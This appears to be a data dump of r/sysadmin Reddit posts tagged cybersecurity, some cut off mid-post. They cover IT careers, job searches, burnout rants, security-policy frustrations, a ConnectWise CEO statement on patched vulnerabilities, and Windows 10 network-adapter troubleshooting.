(Warning: Long Story - Introduce myself),1,gxu8j9,https://www.reddit.com/r/sysadmin/comments/gxu8j9/i_am_new_to_rsysadmin_and_looking_for_it_job/,2020-06-07 02:38:17,"I would like to talk about myself. I was born completely Deaf and did not learn a word till I was 7. I started learning sign language which is my first language at the deaf school so I finally learned numbers, color, etc. My parents had to learn sign language so they can communicate with me. All teachers know American Sign Language (ASL). They teach math, language, reading, science and all courses to Deaf, hard of hearing, and hearing loss students. How did I get involved in computer ? My dad bought IBM PC 8086/8088 so I learned it with 2400 baud modem when I was 12 or 13. I cannot talk on phone so I used modem (Telix/Procomm) to chat with people. I made some friends thur BBS. I learned how to use unix command in 1988. My dad worked for the university and let me use his shell account. I played with some unix commands such as mail, pico, pine, chmod, telnet, ftp, vi etc. I was self-taught reading computer books such as BASIC language, DOS 3.11, sidekick, Wordperfect, etc. My school taught me how to use Apple Logo programming on Apple IIe. I loved it. Regular school offered me to take QBasic and pascal course so I took them with ASL Interpreter. Pascal was one of my favorite language. I attended Rochester Institute of Technology in 1992. I took courses such as networking (Novell, WinNT 3.11, MS LAN Manager), programming (C++, Hypercard), mainframe (JCL), VAX/VMS, DOS, etc. During the college time, I installed Linux OS (Slackware) on my computer in 1994. Installing/configuring was pain in the ass. It was running with TIA (PPP) that allowed me to use the Internet over 14.4K modem. Later, I used slirp as well. I graduated in Associate's degree and worked for Xerox in Rochester as software tester till My I-94 visa was expired so I went back to Canada. I worked as IT Specialist to manage Novell 4.11 with Windows 95/98 and give support users for IT issues. I assisted my IT supervisor to migrate from Novell to Windows SBS 2003 with Active Directory. I built squid proxy server with Fedora to monitor and control Internet traffic. I developed MS Access with ADO database connection for front-end interface. I communicated with hearing people via writing and emailing. I worked for the company for 10 years and Unfortunately, I got laid off due to recession in 2011. Searching IT jobs was hard for me due to my disability. Most job duties require using phone. I was out of work for 9 months. I put my IT skills in classified ad and IT manager from a small company replied my ad and asked me if I would like to work for him. He was aware that I am Deaf. He has worked with disabled people before so he hired me immediately. I started as IT administrator. My duty was to manage several Windows/Linux Servers with samba file server, DHCP/DNS servers, and Active Directory, update MS Access database/MS SQL for reporting, replace printer toners, and monitor back up files. American company acquired that company in 2014 and they offered me to work for the corporate office as Technical Solutions Analyst. I no longer report to my favorite IT manager and he was let go. My new manager was from U.S. head office so I reported to him. My duties are to set up sec group, distribution group, folders, add/delete/move AD accounts with Exchange/Windows Server 2012/2016 and update tickets for IT issues - Win7 and Win10 (+5000 users and +100 cities over the world) but I still maintained Linux servers till got laid off due to covid-19 a couple months ago. I worked there for 8 years. I don't know if they will rehire me. Of course, I still keep in touch with my former colleagues. so I am looking for a full time position. - Windows &amp; Linux Administrator, CyberSecurity, DevOps, or Tech Support. Open to a remote position as well. I am Canadian Citizen. I have good Linux skills but never have certification so I decided to study Linux+. Finding a job is hard for me due to my disability and covid-19. There are too many applicants like 100 - 300 for one position. Some positions require phone. It makes more difficult for me to get in. Well, I followed up with several companies and they did not select me. I usually request an accommodation (interpreter) for Job interview. My disability does not interfere in any way with my ability to perform the tasks needed in an IT Department. I communicate very well with clients, customers and colleagues through a combination of emailing, messaging and writing for my daily tasks. I will be happy to answer any questions that you may have concerning my disability. Someone suggested me to join r/sysadmin so I would like to grow my network in Linkedin. Please free to add my profile. [URL I'll send my detailed resume on request. I will be glad to hear your feedback! Thank you. Daylin"

It's not an immediate job, though. The start date will likely be early/mid 2022. I can definitely do the networking side of things and take care of the desktop computers connected to it. The part I'm worried about is that they want to maintain a server onsite which will likely store sensitive info such as credit cards etc. I've been working with computers for almost 6 years now. I've done everything from troubleshoot my dozens of various Linux installations to learning several programming languages. I just finished about 3 semesters of college for 2 associates degrees in Computer Science and CyberSecurity. I've been focusing on my CS degree, and tbh, I really haven't learned much of anything. So with that background, I'm nervous about taking on the responsibility of maintaining 100% security on that server, because I have no background in it. I asked my IT instructors about it. I heard back from one (who, btw, swears by a college education) who said she thinks I should finish my CyberSecurity degree first. I asked some people in an online Linux community and they said to set up as much hardware and software as possible and teach myself. I've taught myself almost everything I know about IT, so that sounds like a great way to go. But I wanted to hear from people who actually do the same kind of job I'm looking at to get their opinion. Should I finish my CyberSecurity degree? Should I just focus on a few specific classes? Should I focus on getting certifications like Security+ and Server+? Should I just set up my own little network with switches and a digital phone and all that? Any other options I haven't thought of yet?"

The interview went smoothly and I handled everything they threw at me pretty well, but now that I'm actually here I feel like a deer caught in headlights. I'm now the infosec admin for a mid-sized company that's only just started to put together an IT team over the past 5 years. They really don't have any security policies or controls in place yet, and it seems like that's going to be my responsibility going forward. I think that I can handle it, after all it's what I got myself into student loan debt for, but having this much responsibility is getting to my head. Before this pandemic I was just a lowly tech, and now I'm in charge of an organizations entire security strategy, to say that I'm kinda freaking out inside is perhaps an understatement. It doesn't help the lockdown means that everything is being handled remotely now and my training (so far) is essentially just an overview of what systems are already in place and then I just figure everything out from there. Rant over, just wondering if anyone else felt this way before. Maybe it's the nerves of a new job, or maybe I sold myself too well.

Hypervisor vs containers (LXC or Docker) ?,1,gkknsx,https://www.reddit.com/r/sysadmin/comments/gkknsx/overwhelmed_with_what_route_to_choose_hypervisor/,2020-05-16 10:07:17,"So long story short I have been given the time, ability and resources to restructure a cyberLab at my school. It's a small lab that will be used to teach some specific cybersecurity classes, and maybe undergraduate level programming. Possibly Graduate level in the future. I had quite a large budget to use and so I decided to order the following parts for my build... (keep in mind the distance between the server room and the lab is about 150ft.) 1 x Gigabyte R282-Z92 server 24 x Micron 9300 Pro (800GB) drives that will be setup in RAID 1+0 32 x 64GB LRDIMM DDR4 RAM (2TB in total) 2 x AMD 7742 (64 cores each) 1 x Mellanox ConnectX6-DX Nic (200Gb/s Dual port) 1 x Mellanox Switch SN2700 2 x SonicWall NSA5650 (essentiall one will be used for HA) 4 x SonicWall AP's Everything will be interconnected via fiber cables Essentially i was tasked with creating a new and better VDI system for the lab to use. I was thinking of using a hypervisor service (ie VMware or the other options out there). But I want to dabble in containers as I really think that they would be better suited for scaling up and make use of the enterprise hardware available at my finger tips. I envisioned that I would create VM's and using something like apache-guacamole as my vdi broker and have students login via the lab network, or a clientless vpn (remotely) and then signing on through some type of login page. My question is... What would be the better solution to use in terms of Docker or LXC ? Can i use kubernetes to orchestrate maybe clusters of VM containers in order to quickly spin them up before certain classes start( so that different classes may have different needs in terms of applications). Should i look into Jenkins or Chef for this type of project ? Should i look into a solution to use something like MaaS (Ubuntu's Metal as a service) ? \- Forgive me if i sound ignorant by throwing out some of these terms, but after researching all of these technologies, i kinda feel like i can think of variations of use for all of them. I also just want to get some serious skills by not only building this lab but maintaining its daily use (hopefully while learning how to properly use container orchestration services) There are more questions than what i posted but i believe asking the basic questions should be my best starting point."

I don't usually mind it because the money is good and I go home every day at 5. Well last Thursday afternoon my boss tells me the funding has run out so I'm getting moved to a new lab. Ok whatever, a little more heads up would have been nice. But whatever, I'm still employed. So I get to the new job on Monday, meet everybody, and start to get settled in and the new Security dude. The two dude I'm now working with ask me if I've ever used dplunk before. My response is, I've seen it but that's about it because the networks I work on aren't usually big enough to warrant it. So they promptly tell me that I'm the new splunk expert and will be responsible for it going forward. My response to this was, well ok. I guess I can figure it out. Now this new lab that I'm now working in has maybe 75 machines in it that are being used for software development. It's literally a bunch of desktops with like three servers to act as domain controllers and a fileshare. But someone had the brilliant idea of adding splunk to it and it has been sitting unused and untouch since its installation over a year ago. Like, I wowed people when I figured out how to set up event forwarding to it. All you gotta do is google shit folks. It aint that hard.

I would consider effective management practices to be more important than being devoid of flaws in regard to sustainable and continuous security. I am more versed in management practices rather than cybersecurity specifics, which is why I'm requesting insight from those with experience in this field.

However, we want to extend the North American domain and Active Directory into China. The employees of China office will be using ~80% of the services currently utilized globally. This includes all the SSO, Exchange, same O365 Tenant, etc. There have been some concerns raised about replicating non-Chinese employee's AD data (and other regulatory considerations like GDPR) through the Great Firewall of China. The new cybersecurity laws in China allow PKI and AD traffic encryption but not without the ability for the government to have access to this information. I am wondering what have other companies in North America and Europe done to overcome this challenge? We chatted shortly about a stand alone forest with a trust but this may or may not be the best solution."

I have been working in Tech Support for about 5 years now and I am trying to decide on my next move in terms of education. With an abundance of idle time, I have been considering studying for my next certification or IT benchmark, if you will. As a Tech Support employee, I have learned loads of software/hardware break/fix methods as well as some basic networking knowledge. I would love to expand my knowledge in the Networking or Cybersecurity fields (why not both?) but I am looking for a little advice on the most recommended resources and/or certifications. I am guessing that some of you here have had a similar start in the industry to mine and I would love to hear what worked or didn't work for you. &amp;#x200B; Thanks and stay safe! &amp;#x200B; TL;DR - Give me suggestions on how to advance my career in IT past Tech Support."
948,cybersecurity,sysadmin,74% of SMBs would take legal action against their MSP in the event of a breach,1,f2ln65,https://www.reddit.com/r/sysadmin/comments/f2ln65/74_of_smbs_would_take_legal_action_against_their/,2020-02-12 15:39:30,"So let me start by saying I do more than the sysadmins where I work. They focus on networking, and the hiring process at my job has been spectacularly stupid, so the sysadmins focus on networking (badly) and the technicians do the infrastructure, also I do all the firewalls and Palo Alto gear. Won't go into that. Didn't get this job to become some kind of pinnacle in my career, as it was meant to only pay my bills while I went to school. Well they liked me. I mean they really, really fucking liked me. I started being assigned with every. fucking. thing. you. can. think. of. So much that after 1 year, I started backing off. It got too fucking hard. I can see now why people burn out of this job. The last time I worked in IT was almost 10 years ago, took a break after some shit in my life turned everything sour. Really sour. Long break. Learned cool shit, lived. Whatever. Came back to IT in 2016, and immediately got a job in big tech, big 4. Followed the advice of some peers and applied at a startup, level 1. Fuck. My. Life. Go time, prove yourself time, right? Did that shit times ten. I was moved out to the main customer, on-site, ended up getting my own place out there just because I wanted these guys to see just how good I can really do this. Remember, I got the job just to pay a small set of bills, but suddenly I wanted to prove something. Big mistake. This customer went for IPO, more than doubled in size from 500 seats, and migrated to azure and bought all this new shit and fuck my life I was in the middle of all of it. SSO can suck, but I know how to fix it when it does. Fuck mailbox aliases, Microsoft. Anyways. Became the lead contact for our biggest customer, they saw pretty quickly where I was professionally, and suddenly I was the guy that wrote all the documentation, wrote or re-wrote all of the automation and scripting, developed a new imaging and deployment solution, evaluated cybersecurity products and purchases, stiffened them up. List goes on. The longer I was there, the more they had me doing and that's when I started to burn out. I threatened to quit. They shat bricks. So far we've hired replacements that I trained myself, on the promise of moving me into infosec. The stipulation was I had to train my replacements. So far we're at 3 and we're holding, so I think that should cover it. So I've started to move into cybersecurity and now I'm building the entire program, we hired sales guys to pick up new clients and I've spent half my time building or testing new solutions, the other half writing or hacking SANS policy templates into stuff that fits us. So why the rant post? Isn't this every dream? The big cybersecurity guy? 74% of SMB's would take legal action against their MSP in the event of a breach. So I learned that shit about 3 weeks ago. Late in the game? Sorry, went to my first cybersecurity expo and I feel like it was a good experience. Until I saw that. See there's a problem here and that is something I also heard some time ago in this very sub. There was a guy here talking on the hiring process regarding some of the larger firms, and how they actually stay away from MSP guys because their security sucks. WELL LET ME JUST CONFIRM THAT SHIT FOR YOU. If there is a horror story you've got about lax security, plaintext, STUCK TO THE FUCKING FRIDGE DOOR cybersecurity, we were living it. I came back from that expo, and suddenly, I didn't want to do cybersecurity for this company any longer. Because ho. Lee. Shit. They didn't fucking care. Until I came here, they were stuck on 4-char passcodes, no required MFA on anything, legacy you-name-it everywhere, FUCK I found the CEO of a company running 1703 and no antivirus. I found vendors giving out MFA backup codes, or just pressing the goddamn approve button for who-the-fuck-ever! 74% is a big number when nine-tenths of that is full of idiots who hate the idea of MFA, let along long and strong. Legal action is a scary fucking phrase when you're suddenly the one in charge of the cybersecurity program for a company full of people who could give a shit less about it. Do you know what their response was to my policy for our biggest client? ""You're just making extra work."" Well let me introduce you to Mr. No. No, you can't do it the old way. No, we will not turn this off. No, you can't use VPN on your personal phone. No, you can't use the personal phone on the network. No, I'm not just doing this to be an asshole. No is for No more Mr nice guy. I had to clean this up because goddamn it was bad. MFA all the things, long and strong, you name it, we trained it, tested it, and put it to work. Getting into the ML thing has been pretty cool, but fuck my life what can I do about the users? I can't seem to talk to these guys. So why this rant post? Because of another blurb I saw here: Your manager will always see you as the role he hired you for. It wasn't until I saw an asshole say that shit here that it manifested in my meeting room while I brought up, for the 10th time, that I had been moved into cybersecurity and I should not have to deal with the goddamned Helpdesk tickets any longer. Especially since I'm the one that ran that shit for a year straight. My boss, without missing a beat, tried to interrupt me saying ""I hired you for tech support"" -- there it is. You mother. Fucker. They say sometimes the only way to move up is to jump ship. Wow what a fucking rant. So here's the reason I posted this. For one, I needed to get that out to some other sysadmins that do more than their share, more than their bosses, more than their peers, and don't get to say shit about it because they rock the boat or worse, become the toxic team member. Also, on a completely different note, the building owner somehow fished my personal phone number out of our directory and texted me at 9:30pm with this fucking shit. [URL I want to quit my job but if I stick around, I'm a year away from CISSP proper. I don't want to fuck that up. Rant over."

Not anymore. All day everyday, I keep hearing people say ""This isn't working"" ""This is so frustrating"" ""Ugh, I don't have time for this"". Hearing these things on a daily basis, I have become more perceptible to negativity. I had an epiphany today of how much I have changed as a person. I hate it... I hate it when a not so technical person comes in and wants to impose something totally ridiculous. I hate it when people don't create a ticket but just show up or send an IM. I hate it when people assume that IT is just solving end user problems and not maintaining/innovating/developing. I hate it when a user expects no troubleshooting but instant solution. I hate it when people ASSUME things and write an essay about how their ASSUMPTION could be correct without any research what so ever. Oh and security? Lol, one of the ""directors"" wanted to put clear text passwords of clients on ServiceNow. All this while they post cybersecurity articles on LinkedIn. Pisses me off. Another director uses their personal laptop to connect to the VPN. He also has TPB torrents downloading on the same machine. why not give him a company laptop you ask? He has been given one, he just doesn't want to use it. I performed a risk assessment of how terrible this is, provided a neat report, but no one wants to listen. It's been 4 months since this was brought up. For fucks sake. Just let us configure PKI and allow ONLY domain joined laptops to go through the VPN. Let's not even get towards compliance, governance and server patching. It's a fucking joke. Why am I the only one seeing all these cracks? Also why does no one care when a neatly explained report is provided about how we can change things. WHY DON'T PEOPLE REPLY TO EMAILS? Oh and our WSUS policy don't force auto update because users ""lose their files when the machine restarts auto restarts"" you do know that you probably misconfigured the GPO if something like that happens? But nope, every month, I gotta follow up with people requesting them to check for updates and hit install. But hey my users are SO BUSY. They open a ticket and I gotta beg them to make some time for me solve it for them. Seeing open tickets makes me anxious. Most of the open tickets currently (7-8) are just open because users haven't had time for me to help them. I also hate it when people blame everything on IT and blatantly LIE. ""I told IT that I can't copy this file and it's something wrong with how ***my network*** is setup but they said it's not ***my network***. They just solved it and said it was something to do with my network. I knew it was something with my network, they didn't believe me"" what was the issue you ask? The file was open by another user sharing the network share and so the file was locked. Despite clearly explaining what the issue was in an email, they stick by their own thoughts. I hate it when they can't describe their issues but keep rambling about things that no one would understand. Just tell me what you did and send me a screenshot if there is an error! Don't lecture me of how terrible things are. Let's not even get to talking about our implementation of ServiceNow. Our entire business process depends on it, including Invoicing!! And other BUs fuck around with the instances without letting us know. Sadly my boss (Sr. Sysadmin for 16 years) seems to have developed apathy and higher levels of negativity. She always seems to point out the flaws and what could go wrong, even when an idea has greater pros than cons. Classical conditioning, I suppose. I just.. I hope I can be the person I was, calmer and less frustrated. I seem to be getting pissed off at little things that don't matter much. Strange thing? I'm liked by 90% of my co-workers because I try my best to understand them and support them. I keep these angry thoughts in me and try not to showcase them, I believe all of us in IT are forced to be that way. Oh well.. don't let hate fill you over your passion like how it has for me. I had to let these things out. I may come across as a terrible person through this post but that's what this job has forced me to become."

I don't know what all information they have, but I know that employee information including at least partial social security numbers are going to be in their systems. I've suspected that they may not be the most secure in the past because they used to also email password protected pay stub PDF's on pay day but then were unable to send to gmail and other recipient because of the sheer number of messages that they were sending in bursts to where Google would throttle the messages. From what they explained, it sounded exactly like what I had found when I had a client that experienced the same symptoms because they didn't have any sender verification (SPF, DKIM, etc) configured, so I checked and this vendor ALSO didn't have any SPF records created at that time. It took them a while, but looking now, it looks like they figured out how to create SPF records, but it looks like they have no idea what subnetting is as they now specify 26 individual IP address entries each with a /32. I don't have any further context than this, but it sounds to me like a data breach or at the least a strange way to perform mandatory password resets. Am I being paranoid here, or should this not really be possible, or at least that easy. If passwords are properly encrypted, should they be able to modify my existing password to the same thing with a special character appended? &amp;#x200B; &gt;***We want to let you know that weve added this additional character to the end of each individual Users password for increased security: $*** ***Upon log in, all users will be prompted to update and change their password.*** ***Please make sure your employees add this symbol to the end of their password when they login to their \[redacted\] account.

Publication date depends on how much coffee I drink between then and now, as well as the timelines of my editor, indexer, formatter, the patience of my wife, etc. It will be broader, slightly longer, and more technical in a few areas I've investigated since publishing the book you guys are getting.  My background: Former IT, Bachelor's in Robotics, Master's in Cybersecurity Law. Currently I work as an insurance broker with a specialty in cyber insurance. (long story but I love my job)  TL;DR of the book: Cyber insurance is new, complicated, and your insurance guy probably cant help you. Do your best to get it right. There are no experts - not even me.  Yes, you can send this to your colleagues. I own all the rights to this book so fire away.  Ill do my best to answer hyper-specific questions as time allows."

Before this transition I sought out every opportunity I could to explore infosec and even landed my first GIAC cert. What Im quickly learning after landing this new gig is that security is BORING. My job consists of watching alerts all day and categorizing them into True Positives or False Positives. Most of what I see everyday is a never ending alert queue. On top of that, Im expected to write new alerts so I can have even more alerts in my alert queue. I can tell from my brief stint that there is no winning cybersecurity. Its a constant arms race between attacks and detection techniques. My previous position offered at least a chance to lead my own projects which had clearly defined beginnings, middles, and ends and the work was interesting enough. I have the opportunity to go back to my previous position at the same pay which will be a significant pay decrease. honestly Im on the fence. Its a little about money, a little feeling that making a boomerang move is a step backward, but ultimately knowing my skill set and the work I enjoy is important. I think of myself as a solutions guy and not so much a hey Janet from HR, stop downloading solitaire kind of guy. Really long post aside, has anyone else made the jump from sysadmin to infosec?

I'm Opheltes. You may remember me from such previous sysadmin posts such as [Ken Thompson's Unix password](URL [So Many Red Flags](URL and [Christmas Eve On Call](URL Today, sadly, is my last day as a systems administrator. Recently, my pluckly little employer was acquired by a large, well known 3-letter company that is mentioned here often (and never positively). 2019 was a gangbuster year for my plucky little company: yearly revenues increased 800% (!) from 2018, making it the best year in company history. After the acquisition was completed, our new parent company decided to reward us by laying off 10% of plucky company's workforce, including yours truly. Honestly, it came as a bit of shock to me, because my performance was fine and my position cannot be eliminated. (It's part of a gold-plated contract with ridiculously high noncompliance penalties.) After I'm gone, they're going to fly my former teammates in every few weeks to keep the positioned filled. That's expensive and it's probably going to burn out my replacements, but I guess they figure that's ultimately cheaper than keeping me. Nonetheless, I'm landing on my feet. Next week I'll be starting my new job as a python developer at a small cybersecurity firm. The pay is basically the same as my last job, it's very remote friendly, and my closest co-worker there will be a good friend from a previous job. It also puts professional development and cybersecurity experience on my resume, which is something I've been trying to get for a while. All in all, I'm feeling a mix of bitterness at how I was thrown away, and optimism that I'll finally break out of the niche industry where I've spent most of my career, and the usual new-job nervousness.

961,cybersecurity,sysadmin,Response from ConnectWise CEO,1,etj29z,https://www.reddit.com/r/sysadmin/comments/etj29z/response_from_connectwise_ceo/,2020-01-25 11:07:44," From recent email: Dear Partners, Earlier this week, a story was published about potential security vulnerabilities with ConnectWise Control. In the spirit of transparency, I wanted to provide an update on this story and outline what has been done and what our ongoing efforts are to ensure the security of our products, your business and your customers. In late September, ConnectWise received notification from an organization that operates as a consultant in the security space, stating they had identified eight potential vulnerabilities in ConnectWise Control. While our product and security teams felt that many of these potential vulnerabilities presented a low risk of actual attack to our partners, we take security extremely seriously and investigated, resolving six of the areas of concern by October 2, 2019. While the threat landscape is ever changing, we seek to constantly and proactively manage security efforts not only through the updating of our products, but through the education of our team and collaboration with third-party security experts. As security is of critical importance to us, here are some of things we have been doing and where we are today: ConnectWise recently passed an independent SOC 2 Type 2 audit for the benefit of all current and prospective Partners. We regularly conduct penetration tests performed by both internal and external resource and have implemented ethical hacker training, OWASP processes, and consistently run vulnerability assessments on our systems and products. We have implemented tools that automatically evaluate behavior to reduce misuse of our products, started implementing machine learning to detect anomalies in logins, and we are about to launch a bug bounty program, as well as started the rollout of MFA and SSO across the platform. In Q4 of 2019, we also invested in a comprehensive developer security training curriculum to increase the security skills of our teams and assure that our developers are training on the most recent and relevant application security coding practices. On January 21, 2020 we launched the ConnectWise Security Trust site, which will be a primary source of information on security incidents, relevant alerts and of course critical patches and product updates. We hired GuidePoint, an independent third-party cybersecurity solutions company, to further validate our patches and confirm that the vulnerabilities were mitigated. We have published a matrix outlining each potential vulnerability with the perspectives from Bishop Fox, Huntress Labs and GuidePoint, along with our stance on the issue and any action being taken. One of the remaining two suggested areas of remediation is Cross-site Scripting (XSS) which is the potential for abuse of the Control Administrator roles ability to customize the application. This customization ability is a key feature of Control that many partners value. This issue is considered a low actual risk, but we will be removing the option from our trial offering. The final identified issue is related to Security Headers. The strongest defense involves layers of security. Security Headers represent one option for implementing certain layers. In the absence of Security Headers, ConnectWise does implement security layers addressing the types of threats reported in the consultants assessment. As we continue to investigate potential vulnerabilities and implement mitigation plans, we will be posting updates to our Security Trust site. I encourage you to check this site for the latest information, as well as furture updates from our work with GuidePoint. In our conversations with Huntress Labs to compare our findings and their results, Kyle Hanslovan, CEO of Huntress Labs has this to share: Bugs happen. And its not about when bugs happen, but its about what you do when they happen. We were happy to work with CRN earlier this week to confirm that ConnectWise had already patched 6 of the 8 items found. I think three things matter in this scenario: Were the bugs acknowledged, were the bugs fixed and was the company passionate about fixing them for the right reasons? I think ConnectWise came through on all three things, and after our positive conversation on January 23, were excited about continuing to work with ConnectWise and other vendors for the benefit of the channel as a whole. I want to assure you, our partners, that we understand the trust you place in our products and people and we take that trust seriously. We have and will continue to invest heavily in security, and you have our unrelenting commitment to security and transparency, and we appreciate your questions and feedback to our continuous improvement. Thank you, Jason Magee"

This unexpected stoppage, followed by a late rally that expanded the MAS's lead just enough to win outright in the first round, led to accusations of electoral fraud that fueled a protest movement which eventually overthrew the government. [URL At first, this might not appear to be relevant to this community, but I believe the stoppage occurred because of communication failures between the administrator of the vote tabulation system and the cybersecurity team hired to audit and monitor that system. Crucially, the system administrator wasn't present on-site for the election, so when he reconfigured the network without warning at a critical moment, the cybersecurity team was caught unaware. They tried multiple times to get into contact with him but failed, so they put out a 'maximum alert' to the election board which caused the halting of the preliminary vote count. I think my narrative, if correct, could be an interesting case study of deficient system administration and a lesson for the future. (Don't work remotely while administering an election!) The technical details seem like a real hurdle for most people's understanding of the story, so I hoped that by coming here I might get more feedback about those aspects and perhaps someone could fill in some of the holes in the story.

I would appreciate some input in determining the vulnerabilities of our system in place. Please feel free to guide me to the correct sub-reddit if this isn't it. Thank you so much for reading through this, kind stranger and apologize if i used the wrong terminology as English is not my first language. **The system as is:** * admin is retired friend of family that worked in IT all his life. * server was built and is protected by a small, yet reputable company (external company) * free guest WiFi is separate from LAN network where our employees operate. * user accounts have minimum rights, installs etc. can only be done by admin. Admin account itself is on the same computer as regular account, not separate, has strong password, but no 2-factor authentication. * e-mail is hosted on the servers of our web agency (external company) * reputable anti-virus system is installed on all end-points * back-up is done to local NAS server daily for important information and twice a week for everything else. Furthermore, all backups are done again and stored on a HDD off property once a week. * employees are being trained on essentials such as identifying phishing e-mails or declining external storage devices * password manager with 2FA prevents weak passwords * only mobile / home devices of the boss contain confidential information and are protected by anti virus and can be completely wiped remotely in case of theft or loss. * neither disk nor backup is being encrypted * only limited, necessary software which is always up to date. &amp;#x200B; **Now to my questions:** 1. Do you guys see any blatant vulnerabilities that I am missing? Again, I am no expert and have never worked as IT admin. 2. How do I assess the security of the external providers (e-mail and internet server)? Because in the end, I am responsible for my data and do not want to be affected by the negligence on the part of another company. I am particularly worried about e-mail as it contains so much personal information (reservations, home addresses, ...) and thus thought about turning to ProtonMail, for instance, as e-mail alternative which ticks all the points for me (zero knowledge, encrypted, 2FA, open source). 3. Should the admin account be operated through a separate computer only, cut off from internet entirely and secured by 2FA? Thank you so much for anyone even reading through this and any one suggestion. **Every input is highly appreciated and cannot thank you enough.** Even if you are unable to answer my questions or if the post is too long, I would love to receive useful links to educate myself further.

And, in the process, they removed his Office 365 account. I tried to walk him through uninstalling the software but for some reason, the *Uninstall* button isn't working. So it looks like I have a fun night ahead of me, and someone is going to lose their local admin privileges. Of course, this is all really my fault for letting him have local admin. He can't be blamed for trusting the ""IT people."" But, what really angers me is that this random-ass MSP has the audacity to mess with hardware that isn't theirs. And, even if it WAS their machine, why the hell would they remove a *business* account from Outlook when they have no idea what it's for? I would have at least *asked*."

983,cybersecurity,sysadmin,Resigning from a primarily remote position?,6,dhsjwf,https://www.reddit.com/r/sysadmin/comments/dhsjwf/resigning_from_a_primarily_remote_position/,2019-10-15 02:56:35,"tl;dr: I work on the security team at a Fortune 500, in a contract-to-hire role from an IT staffing firm. I'm predominantly remote, as the office is 3-4 hours away round trip. How do I go about quitting? Special snowflake background: about nine months ago, I left a consulting job to take a contract-to-hire security operations position in a large, public company. The director was one of the smartest, most impressive people I'd ever met, and the CISO talked up her strategy to dramatically expand and enhance the company's security team. They rebuilding. It was exciting! I accepted the offer. Two months later, the director and CISO were both fired. This coincided with some key retirements the same week. Senior leadership in IT and security nearly ceased to exist, with the few remaining directors spread too thin to actually accomplish much. Any semblance of a strategic security plan was tossed right in the garbage, and the resources for my team vanished. I've spent six months trying to be a good sport - stepping up to tackle projects, expanding other capabilities, and generally just trying to keep everything moving in the right direction. But we still don't have a CISO. None of the directors have been replaced. The remaining directors have told me, in unofficial terms, that they still intend to convert me to full time, but in a different role. Yet they've offered no specifics. It's all very cloak and dagger, and I'm tired of it. So when a friend referred me to a full-time cybersecurity consulting firm offering more pay, equity, and a better commute, I was all too happy to interview and accept their offer. Now I'm stuck on the particulars. I want to give my two weeks' notice, but I'm not sure on the protocol. I have three quasi-bosses at the company I do the work for (technically I report directly to the CIO now, but he doesn't even know my name), plus the contracting firm who actually employs me. I don't know any of these people especially well, and they aren't reliably all in one place. Is there some specific order of operations for notifying people? I have no intention of committing myself to daily four-hour round trips for two weeks, but there's no bad blood; I want to be available and helpful and make sure the transition is as smooth as it can be under the circumstances. A simple emailed resignation letter to the four of them seems . . . cold."

Impact installed some kind of utility on everyone's machine, saying it is for support, ok, whatever. But the new policy is to leave all our machines on at night with browser open so they can provide security updates (machines can be locked, but not asleep). This doesn't sound right to me! Does anyone have a theory on why they would need our machines on at all times with an active browser? I think they are doing data mining. We work in a security related industry, and I doubt the people on the other side are all provable US citizens. Hard to find information on them (impact networking is a very cloudy search term).

989,cybersecurity,sysadmin,"Upgrade to Windows 10 causing periodic network interface dropouts, and resolution setting failures. Google hasn't helped!",1,dp5kiu,https://www.reddit.com/r/sysadmin/comments/dp5kiu/upgrade_to_windows_10_causing_periodic_network/,2019-10-30 22:43:45,"Hello All, Long time reddit lurker, recently made an account for more browsing options and to post for some help with my professional issues that are driving me nuts (hopefully I can get involved and give back too). Background: Software Engineer with strong IT/sysadmin background, so I wind up responsible for code and the system. Summary: Have a mission critical proprietary system, previously running linux on 6 computers, with 6 redundant cold backups. On 2 of the computers on each set, due to a required COTS software that only works in windows, had virtualbox VMs running Win 10 pro. Each computer has DUAL NICs running 2 separate redundant network connections. Another lovely note is the system is forced isolated so doesn't touch the interwebs. Due to security and performance issues recently had to replace the 4 total linux/VM cards with bare metal windows 10 enterprise, V 1803 I think (Cybersecurity locked down to make things more fun). Problems since upgrade: 1. Periodically, I'd say 2 - 3 times in an 8 hour period across the 4 cards, we will lose an interface completely. It will disappear from the display adapters and we will lose that redundant network from the card. Eventually we would lose both interfaces and completely lose the card. - Band-Aid: A script savvy coworker is using ipconfig to monitor the interfaces, and powershell's restart-netadapter to bring back the interfaces on loss. However this still results in redundancy loss, and very rarely total card inaccessibility, for the brief time it takes to restart. It is also noticeable by the user. - Solutions attempted: 1. In googling I found plenty of information about driver problems causing this, however our chipset's newest driver is installed (2016 newest, the chipset is a bit old) and matches the latest in the windows update repo. I also tried to install (manually since no internet) the Intel specific drivers and the same issue was present. 2. Another issue that was common with this problem was power settings. I changed the drivers power management settings getting rid of letting windows turn it off, as well as the advanced power management settings (green mode and all that) and still didn't affect the problem. I attempted changing these through the driver properties as well as through the registry. -HELP! I reached out hoping there might be more ideas from the r/sysadmin experts with things I hadn't tried or reasons what I tried didn't work! 2. Periodically, I'd say every 5th boot of the system, OR every press of the button that swaps our displays (we have a video multiplexer in line between comps and monitors, and the monitors are NOT standard off the shelf) windows resolution comes up stretched beyond the boundaries of the monitor. Unfortunately windows still thinks its in the proper resolution (1920 X 1080) when this happens. Our software windows wind up cut off and partially not unusable in this condition. - Band Aid: not really one, keep rebooting or swapping the monitors and it will figure itself out, but do it too many times and it will happen again. - Solutions Attempted: 1. In googling found and modified a set resolution function for powershell (think I found some of it on r/sysadmin). Implemented and called it after initial boot, including setting to bad resolution and back to good resolution, and didn't make a difference. Still got the bad display periodically. Likely because windows thinks the res is fine. 2. Since swapping monitors with our multiplexer seemed to fix the problem, I blanked out the displays with it by setting a test pattern, and then reinitialized the outputs to the monitors, hoping that startup was resulting in the bad resolution. This did not work, and was when I discovered that just hitting the swap monitor button caused the bad resolution eventually too. NOTE- We have had resolution issues on linux, that were eventually solved by putting a set resolution script in a fixed loop that goes until resolution returns properly. Difference here is linux seems to be able to tell when the resolution is not proper, windows always seems to return me 1920x1080, including with implementing powershell's function get-screenresolution. - HELP! I have looked at editing INF and EDIS posts on google thinking this may be he issue, assuming my lovely monitors are returning bad info, but so far have not found a path forward to start working with it. Any ideas from you all with respect to that path or any others would be great! Thanks for looking!"

